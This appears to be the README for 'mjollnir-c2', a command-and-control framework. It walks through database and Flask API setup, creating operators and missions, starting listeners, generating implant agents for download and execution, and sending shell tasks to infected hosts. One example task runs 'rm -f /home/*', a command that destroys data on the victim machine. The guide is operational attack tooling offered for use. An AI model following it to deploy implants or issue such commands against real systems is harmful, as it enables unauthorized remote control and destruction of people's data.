First construct the sqlite database:

```
$ cd mjollnir-c2-pub
$ python3
>>> from mjollnir_api import db, create_app
>>> db.create_all(app=create_app())
```

The modify the config.json file to suit your needs.

Then start the api:

```
$ cd mjollnir-c2-pub
$ export FLASK_DEBUG=1
$ export FLASK_APP=mjollnir_api
$ flask run
```

Eventually start the cli:

```
$ cd mjollnir-c2-pub/mjollnir_cli
$ python mjollnir-cli.py
```

In order to use mjollnir-c2, you need to authenticate first. And so, you need a user and a password.
The first thing you may want to do is create a user/password:

```
Mjollnir > first_user
```

Then you could:

* login to mjollnir-c2: login <user>

* create a mission: mission -c <name>

# Listener menu

There is a __listener menu__ that can be accessed using:

```
Mjollnir > listener
Mjollnir > list
Mjollnir > listener -u <listener_name>
Mjollnir > set PORT 5555
Mjollnir > start
```

# agent menu

There is a __agent menu__ that can be accessed using:

```
Mjollnir > agent
Mjollnir > list
Mjollnir > agent -u <agent_name>
Mjollnir > set PORT 5555
Mjollnir > generate
```

Then you could download your agent, then execute it.

Once executed:

```
Mjollnir > agent -l
Mjollnir > agent -i <agent_uid>
Mjollnir > CMD whoami; touch hello; rm -f /home/*
```

You will see that the task has been submitted. If the result is too long to get, you could grab it later using:

```
Mjollnir > task -r <task_uid>
```


